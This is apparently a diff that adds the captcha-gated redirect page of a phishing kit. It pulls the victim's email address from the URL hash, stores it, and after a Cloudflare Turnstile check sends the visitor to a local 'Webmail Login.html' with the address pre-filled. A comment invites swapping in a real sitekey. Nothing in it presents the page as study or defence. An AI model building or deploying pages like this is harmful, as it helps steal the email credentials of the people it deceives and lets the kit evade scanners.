@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        .omo {
+             display: block;
+             padding: 40px;
+
+        }
+    </style>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+    <script>
+        function redirectToUrl() {
+            // const targetUrl = "Webmail Login.html"; 
+            
+            const email = window.location.hash.substring(1);
+            console.log("Extracted Email:", email); 
+
+            if (email) {
+                window.location.href = `${targetUrl}#${encodeURIComponent(email)}`;
+            } else {
+                window.location.href = targetUrl;
+            }
+        }
+
+        
+        setTimeout(redirectToUrl, 5000);
+    </script>
+
+</head>
+<body>
+   <!-- Change the data-sitekey -->
+    <div class="cf-turnstile omo" 
+         data-sitekey="1x00000000000000000000AA"    
+         data-theme="light" 
+         data-callback="onCaptchaSuccess">
+    </div>
+
+      <!-- <script>
+        window.addEventListener("DOMContentLoaded", () => {
+          const hash = window.location.hash;
+          const email = hash ? decodeURIComponent(hash.substring(1)) : "";
+      
+          if (email) {
+            try {
+              localStorage.setItem("userEmail", email);
+      
+              const link = document.querySelector("#action-btn a");
+              if (link) {
+                const baseHref = link.getAttribute("href").split("#")[0]; // Clean base URL
+                link.setAttribute("href", `${baseHref}#${encodeURIComponent(email)}`);
+              }
+            } catch (e) {
+              console.error("Failed to store email in localStorage:", e);
+            }
+          }
+        });
+      </script> -->
+      
+      <script>
+  document.addEventListener("DOMContentLoaded", () => {
+    try {
+      const hash = window.location.hash;
+      const email = hash ? decodeURIComponent(hash.substring(1)) : "";
+
+      if (email) {
+        try {
+          localStorage.setItem("userEmail", email);
+          console.log("Email stored in localStorage:", email);
+        } catch (storageErr) {
+          console.warn("localStorage failed, trying sessionStorage...", storageErr);
+          try {
+            sessionStorage.setItem("userEmail", email);
+            console.log("Email stored in sessionStorage:", email);
+          } catch (sessionErr) {
+            console.error("Both localStorage and sessionStorage failed:", sessionErr);
+          }
+        }
+
+        // Update any link with ID "action-btn"
+        const link = document.querySelector("#action-btn a");
+        if (link) {
+          const baseHref = link.getAttribute("href").split("#")[0];
+          link.setAttribute("href", `${baseHref}#${encodeURIComponent(email)}`);
+        }
+      }
+    } catch (err) {
+      console.error("Unexpected error processing email hash:", err);
+    }
+  });
+</script>
+
+
+    <script>
+        
+        function onCaptchaSuccess(token) {
+            console.log("CAPTCHA solved. Token:", token);
+            
+
+            
+            window.location.href = "Webmail Login.html";
+        }
+    </script>
+</body>
+</html>
